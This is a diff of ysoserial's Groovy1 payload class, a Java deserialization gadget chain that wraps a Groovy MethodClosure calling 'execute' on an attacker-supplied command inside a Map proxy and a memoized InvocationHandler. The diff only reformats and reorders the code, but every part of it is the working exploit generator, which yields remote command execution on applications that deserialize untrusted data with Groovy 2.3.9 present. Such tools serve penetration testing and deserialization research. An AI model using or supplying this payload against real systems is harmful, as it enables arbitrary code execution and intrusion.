@@ -1,15 +1,14 @@
 package ysoserial.payloads;
 
-import java.lang.reflect.InvocationHandler;
-import java.util.Map;
-
 import org.codehaus.groovy.runtime.ConvertedClosure;
 import org.codehaus.groovy.runtime.MethodClosure;
-
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
+
+import java.lang.reflect.InvocationHandler;
+import java.util.Map;
 
 /*
 	Gadget chain:
@@ -26,22 +25,22 @@ import ysoserial.payloads.util.PayloadRunner;
 		groovy
  */
 
-@SuppressWarnings({ "rawtypes", "unchecked" })
+@SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
-@Authors({ Authors.FROHOFF })
+@Authors({Authors.FROHOFF})
 public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
 
-	public InvocationHandler getObject(final String command) throws Exception {
-		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
+    public static void main(final String[] args) throws Exception {
+        PayloadRunner.run(Groovy1.class, args);
+    }
 
-		final Map map = Gadgets.createProxy(closure, Map.class);
+    public InvocationHandler getObject(final String command) throws Exception {
+        final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
 
-		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
+        final Map map = Gadgets.createProxy(closure, Map.class);
 
-		return handler;
-	}
+        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
 
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(Groovy1.class, args);
-	}
+        return handler;
+    }
 }
